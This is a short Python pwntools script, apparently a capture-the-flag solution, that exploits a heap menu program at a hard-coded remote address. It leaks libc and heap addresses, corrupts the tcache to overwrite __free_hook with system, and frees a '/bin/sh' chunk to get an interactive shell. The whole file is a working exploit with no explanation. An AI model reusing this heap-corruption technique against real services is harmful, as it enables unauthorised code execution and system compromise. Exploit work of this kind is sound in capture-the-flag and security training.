from pwn import *

context.terminal = "tmux splitw -h".split()
#context.log_level = "debug"
# p = process("./main2", env={"LD_PRELOAD":"./libc.so.6"})
p = remote("103.127.99.15", 1337)
libc = ELF("./libc.so.6")
cmd = ""
DEBUG = 0
if DEBUG:
	gdb.attach(p, cmd)

def goto(n):
	p.sendlineafter("choice: ", str(n).encode())
	return

def alloc(idx, sz, data):
	goto(1)
	p.sendlineafter(": ", str(idx).encode())
	p.sendlineafter(": ", str(sz).encode())
	p.sendlineafter(": ", data)
	return

def edit(idx, data):
	goto(2)
	p.sendlineafter(": ", str(idx).encode())
	p.sendlineafter(": ", data)
	return

def free(idx):
	goto(3)
	p.sendlineafter(": ", str(idx).encode())


alloc(6, 0x100000, b"AAA")
p.recvuntil("There are ")
libc_address = int(p.recvuntil(" ", drop=True))-0x11+0x101000
libc.address = libc_address
free_hook = libc.symbols['__free_hook']
print(hex(libc_address))
pause()
free(6)
alloc(6, 0x80, b"")
p.recvuntil("There are ")
heap_leak = int(p.recvuntil(" ", drop=True))-0x1
print(hex(heap_leak))
free(6)
alloc(6, 0, b"")
alloc(1, 0x40, b"BBBB")
alloc(2, 0x40, b"CCCC")
alloc(0, 0x40, b"")
free(2)
free(1)
edit(6, b"\x00"*(0x20-2)+p64(free_hook))
alloc(1, 0x40, b"/bin/sh")
alloc(2, 0x40, p64(libc.symbols['system']))
free(1)
p.interactive()
